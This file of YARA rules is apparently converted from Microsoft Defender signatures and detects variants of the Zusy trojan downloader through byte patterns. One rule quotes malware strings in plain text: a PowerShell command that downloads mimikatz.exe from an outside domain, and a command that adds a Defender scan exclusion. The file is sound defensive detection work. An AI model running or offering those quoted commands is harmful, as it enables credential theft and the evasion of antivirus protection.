rule TrojanDownloader_Win32_Zusy_SIB_2147817769_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/Zusy.SIB!MTB"
        threat_id = "2147817769"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "Zusy"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 4d 08 83 c1 01 89 4d 08 8b 55 08 0f be 02 85 c0 74 ?? 8b 4d 08 8a 11 80 c2 ?? 8b 45 08 88 10}  //weight: 1, accuracy: Low
        $x_1_2 = {83 c0 01 89 45 ?? 8b 4d 00 3b 0d ?? ?? ?? ?? 73 ?? 8b 15 ?? ?? ?? ?? 03 55 00 0f b6 02 33 05 ?? ?? ?? ?? 03 05 ?? ?? ?? ?? 8b 0d 04 03 4d 00 88 01}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_Zusy_HNB_2147928956_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/Zusy.HNB!MTB"
        threat_id = "2147928956"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "Zusy"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 2f 6e 65 77 2f 6e 65 74 5f 61 70 69 00}  //weight: 1, accuracy: High
        $x_1_2 = {00 7d 00 00 00 7d 00 66 69 6c 65 00 6e 61 6d 65 00 73 69 7a 65 00 64 6f 77 6e 6c 6f 61 64 5f 75 72 6c 00}  //weight: 1, accuracy: High
        $x_2_3 = {00 6d 00 73 00 69 00 65 00 78 00 65 00 63 00 2e 00 65 00 78 00 65 00 00 00 5c 00 70 6f 77 65 72 73 68 65 6c 6c 20 2d 43 6f 6d 6d 61 6e 64 20}  //weight: 2, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_Zusy_HNA_2147928997_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/Zusy.HNA!MTB"
        threat_id = "2147928997"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "Zusy"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "37"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {8b 46 04 3b c7 0f 84 78 ff ff ff 83 c4 44 5d 5f 5e 5b c3}  //weight: 1, accuracy: High
        $x_1_2 = {2e 74 6d 70 00 00 00 00 49 6e 6e 6f 53 65 74 75 70 4c 64 72 57 69 6e 64 6f 77 00 00 53 54 41 54 49 43 00 00 ff ff ff ff}  //weight: 1, accuracy: High
        $x_1_3 = {54 4d 50 00 ff ff ff ff 04 00 00 00 54 45 4d 50 00 00 00 00 ff ff ff ff 0b 00 00 00 55 53 45 52 50 52 4f 46 49 4c 45 00 53 56 57 8b}  //weight: 1, accuracy: High
        $x_10_4 = {ea ea bb bb e1 c2 58 31 43 43 00 00 00 00 00 00 00 00 00 00 00 ec bc ff bc ff 00 00 00 00 00 ea 07 07 bb bb e1 c2 58 31 30 9f 43 00 00 00 00 00 00 00 00 00 00 ec ff bc ff bc 00 ec 00 00 ea ef 07 07 07 bb e1 58 31 30 9f 9f 9f 43 00 00 00}  //weight: 10, accuracy: High
        $x_1_5 = {00 00 00 00 00 00 00 00 00 00 00 00 7a 6c 62 1a}  //weight: 1, accuracy: High
        $x_1_6 = {00 00 00 00 00 00 06 00 03 00 00 00 40 00 00 80 06 00 00 00 70 00 00 80 0a 00 00 00 b0 00 00 80 0e 00 00 00 c8 00 00 80}  //weight: 1, accuracy: High
        $x_1_7 = {00 43 00 6f 00 6d 00 70 00 61 00 6e 00 79 00 4e 00 61 00 6d 00 65 00 00 00 00 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00}  //weight: 1, accuracy: High
        $x_1_8 = {00 00 00 00 ee 00 65 00 01 00 4c 00 65 00 67 00 61 00 6c 00 43 00 6f 00 70 00 79 00 72 00 69 00 67 00 68 00 74 00 00 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00 20 00}  //weight: 1, accuracy: High
        $x_20_9 = {ed 24 8f 52 77 7c ff ff f1 34 e1 e5}  //weight: 20, accuracy: High
        $x_20_10 = {f2 59 97 e1 12 2e 79 79 62 99 92 3e}  //weight: 20, accuracy: High
        $x_20_11 = {e8 ab ea 6b c7 a1 24 9d 48 cd e4 99}  //weight: 20, accuracy: High
        $x_20_12 = {34 c7 66 02 13 13 f7 55 fe 7d de 55}  //weight: 20, accuracy: High
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_20_*) and 1 of ($x_10_*) and 7 of ($x_1_*))) or
            ((2 of ($x_20_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_Zusy_AZS_2147935782_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/Zusy.AZS!MTB"
        threat_id = "2147935782"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "Zusy"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {51 8d 4d 88 83 fa 08 51 6a 00 6a 00 68 00 02 00 00 6a 00 6a 00 8d 45 d4 0f 43 45 d4 6a 00 50 6a 00}  //weight: 1, accuracy: High
        $x_5_2 = "cmd /c powershell Invoke-WebRequest -Uri https://xspacet.wiki/stein/mimikatz.exe -Outfile C:\\WinXRAR\\mimikatz.exe" ascii //weight: 5
        $x_4_3 = "cmd /c powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath \"C:\\WinXRAR" ascii //weight: 4
        $x_3_4 = "Process launched successfully" ascii //weight: 3
        $x_2_5 = "lderd\\Release\\lderd.pdb" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

